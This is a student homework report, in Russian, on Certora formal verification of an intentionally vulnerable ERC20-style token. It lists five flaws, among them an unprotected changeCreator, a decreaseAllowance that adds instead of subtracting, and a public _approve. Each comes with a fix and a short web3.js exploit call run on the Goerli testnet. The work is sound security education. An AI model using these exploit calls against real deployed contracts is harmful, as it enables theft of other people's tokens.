### Андрян Арсен Сёмаевич БПИ201 HW2
Написание правил \
Правила нахоядтся в ERC226.spec  \
  \
findChangeAllowance добавил из документации чисто по-кайфу  \
  \
a. Правило “Только создатель контракта может что-то сделать”:  \
i. Изменить создателя
onlyCreatorCanChangeCreator(нарушается, там нет чека на создателя, будет в уязвимостях далее)  \
ii. Изменить эмиссию токена  \
onlyCreatorCanMint (не нарушается)  \
b. Разрешения даются правильно:  \
  \
i. increaseAllowance увеличивает баланс  \
increaseAllowanceTest (не нарушается)  \
  \
ii. decreaseAllowance уменьшает баланс  \
decreaseAllowanceTest (нарушается, уязвимость)  \
  \
c. Параметрические правила  \
i. Определите, какие функции изменяют allowance
пользователя  \
Меняет только _approve, increaseAllowance, decreaseAllowance, approve, transferFrom это можно увидеть в таблице в результате после   \
```Results for findChangeAllowance:```
ii. Определите, какие функции изменяют _totalSupply
токена  \
Меняет только mint и burn это можно увидеть в таблице в результате после   \
```Results for findChangeTotalSupply:```

Анализ отчета
a. Провести анализ трассировки транзакции
Результат в Results.txt
b. Выделить ложные срабатывания
Не увидел ложных срабатываний кроме  \
 ```Violated     |1         |Assert message: Unwinding condition in a loop ```

В отчет certora.md привести ссылки на отчеты компании Certora  \
https://prover.certora.com/output/515271/494ebd28853a42fd8f3e57003ee74b9d/?anonymousKey=6f012457d22a7d2374a69a6557b86f2131923246  \

Уязвимости
Уязвимость 1  \
a. В changeCreator не проверяется авторство \
b. функция changeCreator не проверяет автора  \
c. воспользоваться ей просто напрямую вызвать  \
d. своруют авторство, заминтят токены, кто угодно ворует в общем  \
e. добавить модификатор onlyCreator да и аргумент с тем, кому права передать тоже добавить бы\
на практике 
```
var result = await contract.methods.creator().call();
    console.log('result1:', result);

    result = await contract.methods.changeCreator().send({
        from: wallet[0].address,
        gas: 30064,
    });
    console.log('result2:', result);
    result = await contract.methods.creator().call();
    console.log('result3:', result);
```
результат
```
result1: 0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98
result2: {
  some text
}
result3: 0xbC638bcE74a6C83CFE06Eb0dAe44F623daB42CA5
```
Сменил автора 
https://goerli.etherscan.io/tx/0x93662d305fc9bc5beb5fe2d3675727308392974056ca5625eb1e18a88cc2f889


Уязвимость 2  \
a. decreaseAllowance не работает \
b. функция decreaseAllowance не уменьшает, а вычетает  \
c. воспользоваться ей просто напрямую вызвать, когда у тебя уже есть немного разрешенных денег, тупо изниоткуда их генерировать
d. нельзя забрать возможность потратить деньги твои
e. поменять + на - в функции
```
_approve(owner, spender, currentAllowance + subtractedValue);
```
на ```currentAllowance - subtractedValue```
на практике
сначала минтим токен на адрес (баг и без минта работает, представляем ситуацию, что токены есть на адресе )
затем 
```
var result = await contract.methods.increaseAllowance('0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98', 5).send({
        from: wallet[0].address,
        gas: 30064,
    });
```
а потом баг юзаем
```
var result = await contract.methods.decreaseAllowance('0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98', 5).send({
        from: wallet[0].address,
        gas: 30064,
    });
```
и чекаем
```
result = await contract.methods.allowance(wallet[0].address, '0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98').call();
    console.log('result2:', result);
```
результат 10
https://goerli.etherscan.io/tx/0x4c757001a93ef977230cc9798f6d53482a497e01bad93bd93e5b0bece7234ab1
https://goerli.etherscan.io/tx/0x18020aa89f3d6fa46e32d1192c0b855ef78dbfc8ea905dd31b48a0b248cec0b4

Уязвимость 3  \
a. transferFrom кривоват \
b. пусть есть allowance но нет баланса, мы пытаемся перевести, перевести он не даст, т.к. нет денег, а allowance потратится  \
c. воспользоваться не знаю как, когда ты сам управляешь дачей возможности потратить твои деньги, но чисто теоритически можно отловить момент, когда выводятся деньги через transferfrom и вывести раньше так (с большей комиссией), что дача такой возможности пропадет просто так, но звучит бредово и бессмысленно  \
d. человек, кто может потратить твои деньги по итогу не может их потртатить и теряется данной возможности -> кинут
e. возвращать allowance обратно когда не прошла транза по отсутствии баланса
не стал повторять, т.к. не имеет смысла  \

Уязвимость 4  \
a. _approve доступен извне   \
b. просто можно приватную функцию вызвать и allowance начитерить  \
c. просто в скрипте вызываем функцию и можем тратить чужие деньги  \
d. человек просто вызывает эту фукнцию from кошелек откуда воруем to куда воруем и потом выводит чужие токены
e. сделать функцию internal  \

как вызвать

https://goerli.etherscan.io/tx/0xe701a9fac92c43351a3328680ed8ec466f2391a563b184c64ef1a94458030caa
 ```
var result = await contract.methods._approve('0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98', wallet[0].address, 100).send({
    from: wallet[0].address,
    gas: 60064,
});
result = await contract.methods.allowance('0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98', wallet[0].address).call();
```
результат 100
и потом просто через transferFrom воруем ))))

Уязвимость 5  \
a. stopToken без onlyCreator
b. дырявая функция stopToken
c. просто вызываем функцию останавливаем токен)
d. перебои в работе токена 
e. сделать функцию stopToken с модификатором onlyCreator
просто беру и останавливаю токен в наглую )
у меня баланс на тестнете закончился)))))))

https://goerli.etherscan.io/tx/0x9d1d0122f2f905da1e7f8fc6caff66e72f557cef9b1b28615770868f55a5e2b2
(это бывший контракт крейтор, его авторство я уже своровал до этого)
```
var result = await contract.methods.stopToken().send({
    from: wallet[0].address,
    gas: 70064,
});
//result = await contract.methods.('0x2D1355DaDc54d93b3132BBF11e2eEF8E7A68dF98', wallet[0].address).call();
console.log('result2:', result);
```